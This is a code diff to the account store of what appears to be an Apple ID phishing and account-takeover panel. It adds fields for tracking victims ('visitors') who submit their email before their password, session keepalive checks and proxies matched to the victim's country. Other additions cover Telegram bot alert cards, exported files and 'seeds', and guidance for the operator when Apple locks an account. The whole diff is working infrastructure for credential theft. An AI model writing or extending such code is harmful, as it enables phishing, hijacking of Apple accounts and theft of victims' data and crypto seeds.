@@ -71,6 +71,11 @@ function defaultAccount(input) {
     proxy: {
       country: input.proxy?.country ?? "",
       exitIp: input.proxy?.exitIp ?? "",
+      exitCountry: input.proxy?.exitCountry ?? "",
+      matched: input.proxy?.matched ?? null,
+      requestedCountry: input.proxy?.requestedCountry ?? "",
+      supported: input.proxy?.supported ?? null,
+      replacedCountry: input.proxy?.replacedCountry ?? "",
       urlMasked: input.proxy?.urlMasked ?? "",
       ssid: input.proxy?.ssid ?? "",
     },
@@ -85,10 +90,24 @@ function defaultAccount(input) {
     verify: input.verify ?? null,
     scan: input.scan ?? null,
     lastPingAt: input.lastPingAt ?? null,
+    // Last live check (5-hour keepalive or manual Recheck).
+    lastCheckAt: input.lastCheckAt ?? null,
+    // Set when a visitor submits the email step, before the password exists.
+    lastEmailAt: input.lastEmailAt ?? null,
     lastError: input.lastError ?? "",
     createdAt: input.createdAt ?? now,
     updatedAt: input.updatedAt ?? now,
     telegramMessageId: input.telegramMessageId ?? null,
+    // Which token in TELEGRAM_BOT_TOKENS sent the card; only that bot can
+    // edit it, so the choice is persisted with the account.
+    telegramBot: input.telegramBot ?? null,
+    // Soft-hide: keep the account, sessions, export and files; only the
+    // dashboard/Telegram lists hide it.
+    hidden: Boolean(input.hidden),
+    // Transient labels for the panel: new files/seeds expire after 10 min.
+    badges: input.badges ?? {},
+    // Set by "Recheck all"; a verify result then starts export(missing).
+    recheckPending: Boolean(input.recheckPending),
     // Apple locked the account (code -20209). Distinct from a bad password:
     // the operator must point the visitor at iforgot.apple.com.
     locked: Boolean(input.locked),
@@ -363,15 +382,20 @@ export class Store extends EventEmitter {
       "trusted",
       "sessionDir",
       "lastPingAt",
+      "lastCheckAt",
+      "lastEmailAt",
       "lastError",
       "telegramMessageId",
+      "telegramBot",
+      "hidden",
+      "recheckPending",
       "locked",
       "lockCode",
       "unlockUrl",
     ]) {
       if (patch[key] !== undefined) account[key] = patch[key];
     }
-    for (const key of ["fingerprint", "geo", "proxy", "identity", "counts", "export", "verify", "scan"]) {
+    for (const key of ["fingerprint", "geo", "proxy", "identity", "counts", "export", "verify", "scan", "badges"]) {
       if (patch[key] !== undefined) {
         account[key] = { ...(account[key] ?? {}), ...patch[key] };
       }
@@ -385,11 +409,13 @@ export class Store extends EventEmitter {
     return account;
   }
 
-  listAccounts({ page = 1, pageSize = 5, query = "" } = {}) {
+  listAccounts({ page = 1, pageSize = 5, query = "", scope = "visible" } = {}) {
     const size = clampInt(pageSize, 5, 1, 50);
     const q = String(query).trim().toLowerCase();
     const filtered = [...this.accounts.values()]
       .filter((account) => {
+        if (scope === "visible" && account.hidden) return false;
+        if (scope === "hidden" && !account.hidden) return false;
         if (!q) return true;
         return [account.email, account.identity?.name, account.status]
           .join(" ")
@@ -418,6 +444,7 @@ export class Store extends EventEmitter {
       total: this.accounts.size,
       byStatus,
       trusted: [...this.accounts.values()].filter((a) => a.trusted).length,
+      hidden: [...this.accounts.values()].filter((a) => a.hidden).length,
       updatedAt: nowIso(),
     };
   }
